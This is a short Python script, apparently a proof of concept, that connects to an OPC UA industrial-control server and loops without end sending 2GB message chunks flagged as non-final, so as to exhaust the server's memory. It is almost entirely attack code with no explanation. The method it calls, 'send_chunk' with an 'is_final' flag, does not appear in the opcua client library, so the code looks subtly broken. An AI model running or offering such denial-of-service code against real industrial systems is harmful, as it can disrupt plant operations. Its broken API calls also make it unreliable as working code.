import asyncio
from opcua import Client

# Connect to the OPC UA server
client = Client("opc.tcp://localhost:4840/freeopcua/server/")
client.connect()

# Function to send large chunks without final chunk
async def send_large_chunks():
    try:
        while True:
            # Create a large message chunk (e.g., 2GB)
            large_chunk = b"A" * (2 * 1024 * 1024 * 1024)  # 2GB of data
            # Send the chunk to the server
            client.send_chunk(large_chunk, is_final=False)  # is_final=False indicates it's not the final chunk
            print("Sent a large chunk")
            await asyncio.sleep(0.1)  # Small delay to avoid overwhelming the network
    except Exception as e:
        print(f"An error occurred: {e}")

# Run the function
asyncio.run(send_large_chunks())